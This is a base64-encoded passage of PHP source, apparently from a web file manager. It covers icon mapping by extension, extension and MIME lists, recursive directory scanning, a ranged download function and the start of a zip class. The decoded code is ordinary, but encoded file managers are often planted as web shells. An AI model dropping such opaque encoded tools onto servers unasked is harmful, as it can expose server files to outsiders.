ICAgY2FzZSAneHNsJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtZmlsZS1leGNlbC1vJzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICd3YXYnOg0KICAgICAgICBjYXNlICdtcDMnOg0KICAgICAgICBjYXNlICdtcDInOg0KICAgICAgICBjYXNlICdtNGEnOg0KICAgICAgICBjYXNlICdhYWMnOg0KICAgICAgICBjYXNlICdvZ2cnOg0KICAgICAgICBjYXNlICdvZ2EnOg0KICAgICAgICBjYXNlICd3bWEnOg0KICAgICAgICBjYXNlICdta2EnOg0KICAgICAgICBjYXNlICdmbGFjJzoNCiAgICAgICAgY2FzZSAnYWMzJzoNCiAgICAgICAgY2FzZSAndGRzJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtbXVzaWMnOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ20zdSc6DQogICAgICAgIGNhc2UgJ20zdTgnOg0KICAgICAgICBjYXNlICdwbHMnOg0KICAgICAgICBjYXNlICdjdWUnOg0KICAgICAgICBjYXNlICd4c3BmJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtaGVhZHBob25lcyc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAnYXZpJzoNCiAgICAgICAgY2FzZSAnbXBnJzoNCiAgICAgICAgY2FzZSAnbXBlZyc6DQogICAgICAgIGNhc2UgJ21wNCc6DQogICAgICAgIGNhc2UgJ200dic6DQogICAgICAgIGNhc2UgJ2Zsdic6DQogICAgICAgIGNhc2UgJ2Y0dic6DQogICAgICAgIGNhc2UgJ29nbSc6DQogICAgICAgIGNhc2UgJ29ndic6DQogICAgICAgIGNhc2UgJ21vdic6DQogICAgICAgIGNhc2UgJ21rdic6DQogICAgICAgIGNhc2UgJzNncCc6DQogICAgICAgIGNhc2UgJ2FzZic6DQogICAgICAgIGNhc2UgJ3dtdic6DQogICAgICAgIGNhc2UgJ3dlYm0nOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLXZpZGVvLW8nOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ2VtbCc6DQogICAgICAgIGNhc2UgJ21zZyc6DQogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWVudmVsb3BlLW8nOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ3hscyc6DQogICAgICAgIGNhc2UgJ3hsc3gnOg0KICAgICAgICBjYXNlICdvZHMnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLWV4Y2VsLW8nOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ2Nzdic6DQogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWZpbGUtdGV4dC1vJzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICdiYWsnOg0KICAgICAgICBjYXNlICdzd3AnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1jbGlwYm9hcmQnOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGNhc2UgJ2RvYyc6DQogICAgICAgIGNhc2UgJ2RvY3gnOg0KICAgICAgICBjYXNlICdvZHQnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLXdvcmQtbyc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAncHB0JzoNCiAgICAgICAgY2FzZSAncHB0eCc6DQogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWZpbGUtcG93ZXJwb2ludC1vJzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICd0dGYnOg0KICAgICAgICBjYXNlICd0dGMnOg0KICAgICAgICBjYXNlICdvdGYnOg0KICAgICAgICBjYXNlICd3b2ZmJzoNCiAgICAgICAgY2FzZSAnd29mZjInOg0KICAgICAgICBjYXNlICdlb3QnOg0KICAgICAgICBjYXNlICdmb24nOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1mb250JzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICdwZGYnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS1maWxlLXBkZi1vJzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICdwc2QnOg0KICAgICAgICBjYXNlICdhaSc6DQogICAgICAgIGNhc2UgJ2Vwcyc6DQogICAgICAgIGNhc2UgJ2ZsYSc6DQogICAgICAgIGNhc2UgJ3N3Zic6DQogICAgICAgICAgICAkaW1nID0gJ2ZhIGZhLWZpbGUtaW1hZ2Utbyc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgY2FzZSAnZXhlJzoNCiAgICAgICAgY2FzZSAnbXNpJzoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtZmlsZS1vJzsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICdiYXQnOg0KICAgICAgICAgICAgJGltZyA9ICdmYSBmYS10ZXJtaW5hbCc7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICRpbWcgPSAnZmEgZmEtaW5mby1jaXJjbGUnOw0KICAgIH0NCg0KICAgIHJldHVybiAkaW1nOw0KfQ0KDQovKioNCiAqIEdldCBpbWFnZSBmaWxlcyBleHRlbnNpb25zDQogKiBAcmV0dXJuIGFycmF5DQogKi8NCmZ1bmN0aW9uIGZtX2dldF9pbWFnZV9leHRzKCkNCnsNCiAgICByZXR1cm4gYXJyYXkoJ2ljbycsICdnaWYnLCAnanBnJywgJ2pwZWcnLCAnanBjJywgJ2pwMicsICdqcHgnLCAneGJtJywgJ3dibXAnLCAncG5nJywgJ2JtcCcsICd0aWYnLCAndGlmZicsICdwc2QnLCAnc3ZnJywgJ3dlYnAnLCAnYXZpZicpOw0KfQ0KDQovKioNCiAqIEdldCB2aWRlbyBmaWxlcyBleHRlbnNpb25zDQogKiBAcmV0dXJuIGFycmF5DQogKi8NCmZ1bmN0aW9uIGZtX2dldF92aWRlb19leHRzKCkNCnsNCiAgICByZXR1cm4gYXJyYXkoJ2F2aScsICd3ZWJtJywgJ3dtdicsICdtcDQnLCAnbTR2JywgJ29nbScsICdvZ3YnLCAnbW92JywgJ21rdicpOw0KfQ0KDQovKioNCiAqIEdldCBhdWRpbyBmaWxlcyBleHRlbnNpb25zDQogKiBAcmV0dXJuIGFycmF5DQogKi8NCmZ1bmN0aW9uIGZtX2dldF9hdWRpb19leHRzKCkNCnsNCiAgICByZXR1cm4gYXJyYXkoJ3dhdicsICdtcDMnLCAnb2dnJywgJ200YScpOw0KfQ0KDQovKioNCiAqIEdldCB0ZXh0IGZpbGUgZXh0ZW5zaW9ucw0KICogQHJldHVybiBhcnJheQ0KICovDQpmdW5jdGlvbiBmbV9nZXRfdGV4dF9leHRzKCkNCnsNCiAgICByZXR1cm4gYXJyYXkoDQogICAgICAgICd0eHQnLCAnY3NzJywgJ2luaScsICdjb25mJywgJ2xvZycsICdodGFjY2VzcycsICdwYXNzd2QnLCAnZnRwcXVvdGEnLCAnc3FsJywgJ2pzJywgJ3RzJywgJ2pzeCcsICd0c3gnLCAnbWpzJywgJ2pzb24nLCAnc2gnLCAnY29uZmlnJywNCiAgICAgICAgJ3BocCcsICdwaHA0JywgJ3BocDUnLCAncGhwcycsICdwaHRtbCcsICdodG0nLCAnaHRtbCcsICdzaHRtbCcsICd4aHRtbCcsICd4bWwnLCAneHNsJywgJ20zdScsICdtM3U4JywgJ3BscycsICdjdWUnLCAnYmFzaCcsICd2dWUnLA0KICAgICAgICAnZW1sJywgJ21zZycsICdjc3YnLCAnYmF0JywgJ3R3aWcnLCAndHBsJywgJ21kJywgJ2dpdGlnbm9yZScsICdsZXNzJywgJ3Nhc3MnLCAnc2NzcycsICdjJywgJ2NwcCcsICdjcycsICdweScsICdnbycsICd6c2gnLCAnc3dpZnQnLA0KICAgICAgICAnbWFwJywgJ2xvY2snLCAnZHRkJywgJ3N2ZycsICdhc3AnLCAnYXNweCcsICdhc3gnLCAnYXNteCcsICdhc2h4JywgJ2pzcCcsICdqc3B4JywgJ2NnaScsICdkb2NrZXJmaWxlJywgJ3J1YnknLCAneW1sJywgJ3lhbWwnLCAndG9tbCcsDQogICAgICAgICd2aG9zdCcsICdzY3B0JywgJ2FwcGxlc2NyaXB0JywgJ2NzeCcsICdjc2h0bWwnLCAnYysrJywgJ2NvZmZlZScsICdjZm0nLCAncmInLCAnZ3JhcGhxbCcsICdtdXN0YWNoZScsICdqaW5qYScsICdodHRwJywgJ2hhbmRsZWJhcnMnLA0KICAgICAgICAnamF2YScsICdlcycsICdlczYnLCAnbWFya2Rvd24nLCAnd2lraScsICd0bXAnLCAndG9wJywgJ2JvdCcsICdkYXQnLCAnYmFrJywgJ2h0cGFzc3dkJywgJ3BsJw0KICAgICk7DQp9DQoNCi8qKg0KICogR2V0IG1pbWUgdHlwZXMgb2YgdGV4dCBmaWxlcw0KICogQHJldHVybiBhcnJheQ0KICovDQpmdW5jdGlvbiBmbV9nZXRfdGV4dF9taW1lcygpDQp7DQogICAgcmV0dXJuIGFycmF5KA0KICAgICAgICAnYXBwbGljYXRpb24veG1sJywNCiAgICAgICAgJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnLA0KICAgICAgICAnYXBwbGljYXRpb24veC1qYXZhc2NyaXB0JywNCiAgICAgICAgJ2ltYWdlL3N2Zyt4bWwnLA0KICAgICAgICAnbWVzc2FnZS9yZmM4MjInLA0KICAgICAgICAnYXBwbGljYXRpb24vanNvbicsDQogICAgKTsNCn0NCg0KLyoqDQogKiBHZXQgZmlsZSBuYW1lcyBvZiB0ZXh0IGZpbGVzIHcvbyBleHRlbnNpb25zDQogKiBAcmV0dXJuIGFycmF5DQogKi8NCmZ1bmN0aW9uIGZtX2dldF90ZXh0X25hbWVzKCkNCnsNCiAgICByZXR1cm4gYXJyYXkoDQogICAgICAgICdsaWNlbnNlJywNCiAgICAgICAgJ3JlYWRtZScsDQogICAgICAgICdhdXRob3JzJywNCiAgICAgICAgJ2NvbnRyaWJ1dG9ycycsDQogICAgICAgICdjaGFuZ2Vsb2cnLA0KICAgICk7DQp9DQoNCi8qKg0KICogR2V0IG9ubGluZSBkb2NzIHZpZXdlciBzdXBwb3J0ZWQgZmlsZXMgZXh0ZW5zaW9ucw0KICogQHJldHVybiBhcnJheQ0KICovDQpmdW5jdGlvbiBmbV9nZXRfb25saW5lVmlld2VyX2V4dHMoKQ0Kew0KICAgIHJldHVybiBhcnJheSgnZG9jJywgJ2RvY3gnLCAneGxzJywgJ3hsc3gnLCAncGRmJywgJ3BwdCcsICdwcHR4JywgJ2FpJywgJ3BzZCcsICdkeGYnLCAneHBzJywgJ3JhcicsICdvZHQnLCAnb2RzJyk7DQp9DQoNCi8qKg0KICogSXQgcmV0dXJucyB0aGUgbWltZSB0eXBlIG9mIGEgZmlsZSBiYXNlZCBvbiBpdHMgZXh0ZW5zaW9uLg0KICogQHBhcmFtIGV4dGVuc2lvbiBUaGUgZmlsZSBleHRlbnNpb24gb2YgdGhlIGZpbGUgeW91IHdhbnQgdG8gZ2V0IHRoZSBtaW1lIHR5cGUgZm9yLg0KICogQHJldHVybiBzdHJpbmd8c3RyaW5nW10gVGhlIG1pbWUgdHlwZSBvZiB0aGUgZmlsZS4NCiAqLw0KZnVuY3Rpb24gZm1fZ2V0X2ZpbGVfbWltZXMoJGV4dGVuc2lvbikNCnsNCiAgICAkZmlsZVR5cGVzWydzd2YnXSA9ICdhcHBsaWNhdGlvbi94LXNob2Nrd2F2ZS1mbGFzaCc7DQogICAgJGZpbGVUeXBlc1sncGRmJ10gPSAnYXBwbGljYXRpb24vcGRmJzsNCiAgICAkZmlsZVR5cGVzWydleGUnXSA9ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nOw0KICAgICRmaWxlVHlwZXNbJ3ppcCddID0gJ2FwcGxpY2F0aW9uL3ppcCc7DQogICAgJGZpbGVUeXBlc1snZG9jJ10gPSAnYXBwbGljYXRpb24vbXN3b3JkJzsNCiAgICAkZmlsZVR5cGVzWyd4bHMnXSA9ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwnOw0KICAgICRmaWxlVHlwZXNbJ3BwdCddID0gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1wb3dlcnBvaW50JzsNCiAgICAkZmlsZVR5cGVzWydnaWYnXSA9ICdpbWFnZS9naWYnOw0KICAgICRmaWxlVHlwZXNbJ3BuZyddID0gJ2ltYWdlL3BuZyc7DQogICAgJGZpbGVUeXBlc1snanBlZyddID0gJ2ltYWdlL2pwZyc7DQogICAgJGZpbGVUeXBlc1snanBnJ10gPSAnaW1hZ2UvanBnJzsNCiAgICAkZmlsZVR5cGVzWyd3ZWJwJ10gPSAnaW1hZ2Uvd2VicCc7DQogICAgJGZpbGVUeXBlc1snYXZpZiddID0gJ2ltYWdlL2F2aWYnOw0KICAgICRmaWxlVHlwZXNbJ3JhciddID0gJ2FwcGxpY2F0aW9uL3Jhcic7DQoNCiAgICAkZmlsZVR5cGVzWydyYSddID0gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJzsNCiAgICAkZmlsZVR5cGVzWydyYW0nXSA9ICdhdWRpby94LXBuLXJlYWxhdWRpbyc7DQogICAgJGZpbGVUeXBlc1snb2dnJ10gPSAnYXVkaW8veC1wbi1yZWFsYXVkaW8nOw0KDQogICAgJGZpbGVUeXBlc1snd2F2J10gPSAndmlkZW8veC1tc3ZpZGVvJzsNCiAgICAkZmlsZVR5cGVzWyd3bXYnXSA9ICd2aWRlby94LW1zdmlkZW8nOw0KICAgICRmaWxlVHlwZXNbJ2F2aSddID0gJ3ZpZGVvL3gtbXN2aWRlbyc7DQogICAgJGZpbGVUeXBlc1snYXNmJ10gPSAndmlkZW8veC1tc3ZpZGVvJzsNCiAgICAkZmlsZVR5cGVzWydkaXZ4J10gPSAndmlkZW8veC1tc3ZpZGVvJzsNCg0KICAgICRmaWxlVHlwZXNbJ21wMyddID0gJ2F1ZGlvL21wZWcnOw0KICAgICRmaWxlVHlwZXNbJ21wNCddID0gJ2F1ZGlvL21wZWcnOw0KICAgICRmaWxlVHlwZXNbJ21wZWcnXSA9ICd2aWRlby9tcGVnJzsNCiAgICAkZmlsZVR5cGVzWydtcGcnXSA9ICd2aWRlby9tcGVnJzsNCiAgICAkZmlsZVR5cGVzWydtcGUnXSA9ICd2aWRlby9tcGVnJzsNCiAgICAkZmlsZVR5cGVzWydtb3YnXSA9ICd2aWRlby9xdWlja3RpbWUnOw0KICAgICRmaWxlVHlwZXNbJ3N3ZiddID0gJ3ZpZGVvL3F1aWNrdGltZSc7DQogICAgJGZpbGVUeXBlc1snM2dwJ10gPSAndmlkZW8vcXVpY2t0aW1lJzsNCiAgICAkZmlsZVR5cGVzWydtNGEnXSA9ICd2aWRlby9xdWlja3RpbWUnOw0KICAgICRmaWxlVHlwZXNbJ2FhYyddID0gJ3ZpZGVvL3F1aWNrdGltZSc7DQogICAgJGZpbGVUeXBlc1snbTN1J10gPSAndmlkZW8vcXVpY2t0aW1lJzsNCg0KICAgICRmaWxlVHlwZXNbJ3BocCddID0gWydhcHBsaWNhdGlvbi94LXBocCddOw0KICAgICRmaWxlVHlwZXNbJ2h0bWwnXSA9IFsndGV4dC9odG1sJ107DQogICAgJGZpbGVUeXBlc1sndHh0J10gPSBbJ3RleHQvcGxhaW4nXTsNCiAgICAvL1Vua25vd24gbWltZS10eXBlcyBzaG91bGQgYmUgJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScNCiAgICBpZihlbXB0eSgkZmlsZVR5cGVzWyRleHRlbnNpb25dKSkgew0KICAgICAgJGZpbGVUeXBlc1skZXh0ZW5zaW9uXSA9IFsnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJ107DQogICAgfQ0KICAgIHJldHVybiAkZmlsZVR5cGVzWyRleHRlbnNpb25dOw0KfQ0KDQovKioNCiAqIFRoaXMgZnVuY3Rpb24gc2NhbnMgdGhlIGZpbGVzIGFuZCBmb2xkZXIgcmVjdXJzaXZlbHksIGFuZCByZXR1cm4gbWF0Y2hpbmcgZmlsZXMNCiAqIEBwYXJhbSBzdHJpbmcgJGRpcg0KICogQHBhcmFtIHN0cmluZyAkZmlsdGVyDQogKiBAcmV0dXJuIGFycmF5fG51bGwNCiAqLw0KIGZ1bmN0aW9uIHNjYW4oJGRpciA9ICcnLCAkZmlsdGVyID0gJycpIHsNCiAgICAkcGF0aCA9IEZNX1JPT1RfUEFUSC4nLycuJGRpcjsNCiAgICAgaWYoJHBhdGgpIHsNCiAgICAgICAgICRpdGUgPSBuZXcgUmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvcihuZXcgUmVjdXJzaXZlRGlyZWN0b3J5SXRlcmF0b3IoJHBhdGgpKTsNCiAgICAgICAgICRyaWkgPSBuZXcgUmVnZXhJdGVyYXRvcigkaXRlLCAiLygiIC4gJGZpbHRlciAuICIpL2kiKTsNCg0KICAgICAgICAgJGZpbGVzID0gYXJyYXkoKTsNCiAgICAgICAgIGZvcmVhY2ggKCRyaWkgYXMgJGZpbGUpIHsNCiAgICAgICAgICAgICBpZiAoISRmaWxlLT5pc0RpcigpKSB7DQogICAgICAgICAgICAgICAgICRmaWxlTmFtZSA9ICRmaWxlLT5nZXRGaWxlbmFtZSgpOw0KICAgICAgICAgICAgICAgICAkbG9jYXRpb24gPSBzdHJfcmVwbGFjZShGTV9ST09UX1BBVEgsICcnLCAkZmlsZS0+Z2V0UGF0aCgpKTsNCiAgICAgICAgICAgICAgICAgJGZpbGVzW10gPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICJuYW1lIiA9PiAkZmlsZU5hbWUsDQogICAgICAgICAgICAgICAgICAgICAidHlwZSIgPT4gImZpbGUiLA0KICAgICAgICAgICAgICAgICAgICAgInBhdGgiID0+ICRsb2NhdGlvbiwNCiAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICB9DQogICAgICAgICB9DQogICAgICAgICByZXR1cm4gJGZpbGVzOw0KICAgICB9DQp9DQoNCi8qKg0KKiBQYXJhbWV0ZXJzOiBkb3dubG9hZEZpbGUoRmlsZSBMb2NhdGlvbiwgRmlsZSBOYW1lLA0KKiBtYXggc3BlZWQsIGlzIHN0cmVhbWluZw0KKiBJZiBzdHJlYW1pbmcgLSB2aWRlb3Mgd2lsbCBzaG93IGFzIHZpZGVvcywgaW1hZ2VzIGFzIGltYWdlcw0KKiBpbnN0ZWFkIG9mIGRvd25sb2FkIHByb21wdA0KKiBodHRwczovL3N0YWNrb3ZlcmZsb3cuY29tL2EvMTM4MjE5OTIvMTE2NDY0Mg0KKi8NCmZ1bmN0aW9uIGZtX2Rvd25sb2FkX2ZpbGUoJGZpbGVMb2NhdGlvbiwgJGZpbGVOYW1lLCAkY2h1bmtTaXplICA9IDEwMjQpDQp7DQogICAgaWYgKGNvbm5lY3Rpb25fc3RhdHVzKCkgIT0gMCkNCiAgICAgICAgcmV0dXJuIChmYWxzZSk7DQogICAgJGV4dGVuc2lvbiA9IHBhdGhpbmZvKCRmaWxlTmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsNCg0KICAgICRjb250ZW50VHlwZSA9IGZtX2dldF9maWxlX21pbWVzKCRleHRlbnNpb24pOw0KDQogICAgaWYoaXNfYXJyYXkoJGNvbnRlbnRUeXBlKSkgew0KICAgICAgICAkY29udGVudFR5cGUgPSBpbXBsb2RlKCcgJywgJGNvbnRlbnRUeXBlKTsNCiAgICB9DQoNCiAgICAkc2l6ZSA9IGZpbGVzaXplKCRmaWxlTG9jYXRpb24pOw0KDQogICAgaWYgKCRzaXplID09IDApIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ1plcm8gYnl0ZSBmaWxlISBBYm9ydGluZyBkb3dubG9hZCcpLCAnZXJyb3InKTsNCiAgICAgICAgJEZNX1BBVEg9Rk1fUEFUSDsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KDQogICAgICAgIHJldHVybiAoZmFsc2UpOw0KICAgIH0NCg0KICAgIEBpbmlfc2V0KCdtYWdpY19xdW90ZXNfcnVudGltZScsIDApOw0KICAgICRmcCA9IGZvcGVuKCIkZmlsZUxvY2F0aW9uIiwgInJiIik7DQoNCiAgICBpZiAoJGZwID09PSBmYWxzZSkgew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnQ2Fubm90IG9wZW4gZmlsZSEgQWJvcnRpbmcgZG93bmxvYWQnKSwgJ2Vycm9yJyk7DQogICAgICAgICRGTV9QQVRIPUZNX1BBVEg7IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICAgICAgcmV0dXJuIChmYWxzZSk7DQogICAgfQ0KDQogICAgLy8gaGVhZGVycw0KICAgIGhlYWRlcignQ29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2ZlcicpOw0KICAgIGhlYWRlcignRXhwaXJlczogMCcpOw0KICAgIGhlYWRlcignQ2FjaGUtQ29udHJvbDogbXVzdC1yZXZhbGlkYXRlLCBwb3N0LWNoZWNrPTAsIHByZS1jaGVjaz0wJyk7DQogICAgaGVhZGVyKCdQcmFnbWE6IHB1YmxpYycpOw0KICAgIGhlYWRlcigiQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogYmluYXJ5Iik7DQogICAgaGVhZGVyKCJDb250ZW50LVR5cGU6ICRjb250ZW50VHlwZSIpOw0KDQogICAgJGNvbnRlbnREaXNwb3NpdGlvbiA9ICdhdHRhY2htZW50JzsNCg0KICAgIGlmIChzdHJzdHIoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddLCAiTVNJRSIpKSB7DQogICAgICAgICRmaWxlTmFtZSA9IHByZWdfcmVwbGFjZSgnL1wuLycsICclMmUnLCAkZmlsZU5hbWUsIHN1YnN0cl9jb3VudCgkZmlsZU5hbWUsICcuJykgLSAxKTsNCiAgICAgICAgaGVhZGVyKCJDb250ZW50LURpc3Bvc2l0aW9uOiAkY29udGVudERpc3Bvc2l0aW9uO2ZpbGVuYW1lPVwiJGZpbGVOYW1lXCIiKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICBoZWFkZXIoIkNvbnRlbnQtRGlzcG9zaXRpb246ICRjb250ZW50RGlzcG9zaXRpb247ZmlsZW5hbWU9XCIkZmlsZU5hbWVcIiIpOw0KICAgIH0NCg0KICAgIGhlYWRlcigiQWNjZXB0LVJhbmdlczogYnl0ZXMiKTsNCiAgICAkcmFuZ2UgPSAwOw0KDQogICAgaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQX1JBTkdFJ10pKSB7DQogICAgICAgIGxpc3QoJGEsICRyYW5nZSkgPSBleHBsb2RlKCI9IiwgJF9TRVJWRVJbJ0hUVFBfUkFOR0UnXSk7DQogICAgICAgIHN0cl9yZXBsYWNlKCRyYW5nZSwgIi0iLCAkcmFuZ2UpOw0KICAgICAgICAkc2l6ZTIgPSAkc2l6ZSAtIDE7DQogICAgICAgICRuZXdfbGVuZ3RoID0gJHNpemUgLSAkcmFuZ2U7DQogICAgICAgIGhlYWRlcigiSFRUUC8xLjEgMjA2IFBhcnRpYWwgQ29udGVudCIpOw0KICAgICAgICBoZWFkZXIoIkNvbnRlbnQtTGVuZ3RoOiAkbmV3X2xlbmd0aCIpOw0KICAgICAgICBoZWFkZXIoIkNvbnRlbnQtUmFuZ2U6IGJ5dGVzICRyYW5nZSRzaXplMi8kc2l6ZSIpOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRzaXplMiA9ICRzaXplIC0gMTsNCiAgICAgICAgaGVhZGVyKCJDb250ZW50LVJhbmdlOiBieXRlcyAwLSRzaXplMi8kc2l6ZSIpOw0KICAgICAgICBoZWFkZXIoIkNvbnRlbnQtTGVuZ3RoOiAiIC4gJHNpemUpOw0KICAgIH0NCiAgICAkZmlsZUxvY2F0aW9uID0gcmVhbHBhdGgoJGZpbGVMb2NhdGlvbik7DQogICAgd2hpbGUgKG9iX2dldF9sZXZlbCgpKSBvYl9lbmRfY2xlYW4oKTsNCiAgICByZWFkZmlsZSgkZmlsZUxvY2F0aW9uKTsNCg0KICAgIGZjbG9zZSgkZnApOw0KDQogICAgcmV0dXJuICgoY29ubmVjdGlvbl9zdGF0dXMoKSA9PSAwKSBhbmQgIWNvbm5lY3Rpb25fYWJvcnRlZCgpKTsNCn0NCg0KLyoqDQogKiBJZiB0aGUgdGhlbWUgaXMgZGFyaywgcmV0dXJuIHRoZSB0ZXh0LXdoaXRlIGFuZCBiZy1kYXJrIGNsYXNzZXMuDQogKiBAcmV0dXJuIHN0cmluZyB0aGUgdmFsdWUgb2YgdGhlICB2YXJpYWJsZS4NCiAqLw0KZnVuY3Rpb24gZm1fZ2V0X3RoZW1lKCkgew0KICAgICRyZXN1bHQgPSAnJzsNCiAgICBpZihGTV9USEVNRSA9PSAiZGFyayIpIHsNCiAgICAgICAgJHJlc3VsdCA9ICJ0ZXh0LXdoaXRlIGJnLWRhcmsiOw0KICAgIH0NCiAgICByZXR1cm4gJHJlc3VsdDsNCn0NCg0KLyoqDQogKiBDbGFzcyB0byB3b3JrIHdpdGggemlwIGZpbGVzICh1c2luZyBaaXBBcmNoaXZlKQ0KICovDQpjbGFzcyBGTV9aaXBwZXINCnsNCiAgICBwcml2YXRlICR6aXA7DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKQ0KICAgIHsNCiAgICAgICAgJHRoaXMtPnppcCA9IG5ldyBaaXBBcmNoaXZlKCk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQ3JlYXRlIGFyY2hpdmUgd2l0aCBuYW1lICRmaWxlbmFtZSBhbmQgZmlsZXMgJGZpbGVzIChSRUxBVElWRSBQQVRIUyEpDQogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUNCiAgICAgKiBAcGFyYW0gYXJyYXl8c3RyaW5nICRmaWxlcw0KICAgICAqIEByZXR1cm4gYm9vbA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBjcmVhdGUoJGZpbGVuYW1lLCAkZmlsZXMpDQogICAgew0KICAgICAgICAkcmVzID0gJHRoaXMtPnppcC0+b3BlbigkZmlsZW5hbWUsIFppcEFyY2hpdmU6OkNSRUFURSk7DQogICAgICAgIGlmICgkcmVzICE9PSB0cnVlKSB7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzX2FycmF5KCRmaWxlcykpIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRmaWxlcyBhcyAkZikgew0KICAgICAgICAgICAgICAgICRmID0gZm1fY2xlYW5fcGF0aCgkZik7DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+YWRkRmlsZU9yRGlyKCRmKSkgew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+emlwLT5jbG9zZSgpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHRoaXMtPnppcC0+Y2xvc2UoKTsNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaWYgKCR0aGlzLT5hZGRGaWxlT3JEaXIoJGZpbGVzKSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT56aXAtPmNsb3NlKCk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBFeHRyYWN0IGFyY2hpdmUgJGZpbGVuYW1lIHRvIGZvbGRlciAkcGF0aCAoUkVMQVRJVkUgT1IgQUJTT0xVVEUgUEFUSFMpDQogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoDQogICAgICogQHJldHVybiBib29sDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIHVuemlwKCRmaWxlbmFtZSwgJHBhdGgpDQogICAgew0KICAgICAgICAkcmVzID0gJHRoaXMtPnppcC0+b3BlbigkZmlsZW5hbWUpOw0KICAgICAgICBpZiAoJHJlcyAhPT0gdHJ1ZSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+emlwLT5leHRyYWN0VG8oJHBhdGgpKSB7DQogICAgICAgICAgICAkdGhpcy0+emlwLT5jbG9zZSgpOw0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFkZCBmaWxlL2ZvbGRlciB0byBhcmNoaXZlDQogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUNCiAgICAgKiBAcmV0dXJuIGJvb2wNCiAgICAgKi8NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGFkZEZpbGVPckRpcigkZmlsZW5hbWUpDQogICAgew0KICAgICAgICBpZiAoaXNfZmlsZSgkZmlsZW5hbWUpKSB7DQogICAgICAgICAgICByZXR1cm4gJHRoaXMtPnppcC0+